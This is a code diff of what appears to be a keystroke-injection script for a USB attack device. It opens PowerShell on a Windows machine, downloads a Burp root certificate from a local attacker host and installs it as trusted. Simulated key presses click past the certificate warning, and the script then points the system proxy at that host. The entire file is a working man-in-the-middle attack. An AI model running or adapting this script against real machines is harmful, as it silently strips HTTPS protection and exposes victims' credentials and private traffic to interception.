@@ -1,14 +1,20 @@
+/* windows_mitm_proxy.js
+ * Installs the specified Root CA and sets windows to use the proxy specified. 
+ */
+proxyServer = '192.168.0.15:8080'
+certificatURL = 'http://192.168.0.15:9000/burp_cert.der'
+
 layout('us')
+typingSpeed(1, 2);
+
+// Open powershell
 press("GUI r")
 delay(500)
 type("powershell\n")
 delay(1000)
-typingSpeed(1, 2);
 
-let proxyServer = '192.168.0.15:8080'
-let certificatURL = 'https://github.com/0x10F8/ALOAScripts/blob/master/resources/burp_cert.der?raw=true'
-
-type('$regKey="HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"')
+// Download and import and root CA
+type('$regKey="HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"')
 press("ENTER")
 type('$proxy="' + proxyServer + '"')
 press("ENTER")
@@ -18,13 +24,36 @@ type('$tempFile = New-TemporaryFile')
 press("ENTER")
 type('Invoke-WebRequest -Uri $certFileURL -OutFile $tempFile')
 press("ENTER")
+// Wait for the download
+delay(1000)
+
+// Import cert
 type('$certfile = (Get-ChildItem -Path $tempFile)')
 press("ENTER")
-type('$certfile | Import-Certificate -CertStoreLocation cert:\CurrentUser\Root')
+type('$certfile | Import-Certificate -CertStoreLocation cert:\\CurrentUser\\Root')
 press("ENTER")
+
+// Wait for the import certificate confirmation
+delay(2000)
+
+// Move to ok and select it
+press('GUI TAB')
+delay(500)
+press('GUI TAB')
+delay(500)
+press('LEFT')
+delay(100)
+press('ENTER')
+delay(1000)
+press('ENTER')
+
+// Continue setting the CA reg key
 type('Set-ItemProperty -path $regKey ProxyEnable -value 1')
 press("ENTER")
 type('Set-ItemProperty -path $regKey ProxyServer -value $proxy')
 press("ENTER")
 
-press("ALT F4")
+// Quit powershell
+type('exit')
+press('ENTER')
+
